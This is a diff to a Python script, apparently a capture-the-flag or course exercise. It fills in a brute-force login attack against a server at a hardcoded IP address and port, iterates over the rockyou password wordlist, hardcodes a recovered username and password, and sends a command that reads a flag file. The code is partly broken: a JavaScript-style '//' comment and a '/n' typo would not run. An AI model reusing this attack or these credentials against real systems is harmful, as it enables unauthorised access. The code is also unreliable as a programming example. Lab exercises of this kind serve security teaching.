@@ -26,8 +26,8 @@
 
 import socket
 
-host = "" # IP address here
-port = 0000 # Port here
+host = "129.2.94.135" # IP address here
+port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
 def brute_force():
@@ -55,8 +55,47 @@ def brute_force():
             v0idcache's server.
     """
 
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
+    file = open("rockyou.txt", "r")
+
+    for line in file.readlines():
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+
+
+        print("trying Password: " + line)
+
+        # username:
+        data = s.recv(1024)
+
+        #send in username
+        s.send("mnthomp22\n")
+
+        # password:
+        data = s.recv(1024)
+
+        #send in password
+        s.send(line)
+
+         # Can uncomment line below and comment line above to bypass the iteration through wordlist.
+        //s.send("blink182/n")
+
+
+        data = s.recv(1024)
+        print(data)
+
+        if "Fail" not in data:
+            print(line)
+            break
+
+        s.close()
+
+    #flag is in flag.txt file.
+    s.send("cat /home/flag.txt\n")
+    data = s.recv(1024)
+    print(data)
+
+    username = "mnthomp22"   # Hint: use OSINT
+    password = "blink182"   # Hint: use wordlist
 
 
 
